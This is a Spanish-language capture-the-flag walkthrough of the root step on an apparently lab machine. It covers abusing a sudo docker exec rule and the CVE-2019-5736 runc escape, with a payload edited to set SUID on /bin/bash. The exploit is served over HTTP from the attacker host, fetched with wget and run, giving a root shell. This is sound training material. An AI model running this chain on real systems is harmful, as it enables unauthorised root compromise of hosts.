## Escalada de Privilegios {-}

### Rootear la maquina {-}

```bash
id
sudo -l
#Output

(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Investigamos el container webapp-dev01 con docker pero no encontramos nada

```bash
docker --version
#Output

Docker version 18.06.0-ce
``` 

Miramos si existe un exploit en la web `docker 18.06.0-ce exploit github` y encontramos algo en [CVE-2019-5736-POC](https://github.com/Frichetten/CVE-2019-5736-PoC)

```bash
cd exploits
git clone https://github.com/Frichetten/CVE-2019-5736-PoC
cd CVE-2019-5736-PoC

vi main.go
```

Aqui mirando el `main.go` vemos un comentario que dice:

`// This is the line of shell commands that will execute on host`

La modificamos para autorgar un derecho SUID a la bash

```bash
var payload = "#!/bin/bash \n chmod 4755 /bin/bash
```

Ahora lo compilamos y lo transferimos a la maquina victima

1. En la maquina de attackante buildeamos el exploit y preparamos el envio

    ```bash
    go build -ldflags "-s -w" main.go
    ls
    upx main
    mv main exploit
    python -m http.server 80
    ```

1. En la maquina victima nos conectamos al contenedor

    ```bash
    sudo /usr/bin/docker exec -it webapp-dev01 bash
    cd /tmp
    wget http://10.10.14.8/exploit
    ls
    chmod +x exploit
    ./exploit
    ```

1. No conectamos nuevamente con ssh

    ```bash
    ssh -i id_rsa noah@10.10.10.230
    sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
    ls -l /bin/bash
    bash -p
    whoami

    root
    ```

Ya estamos root y podemos leer la flag
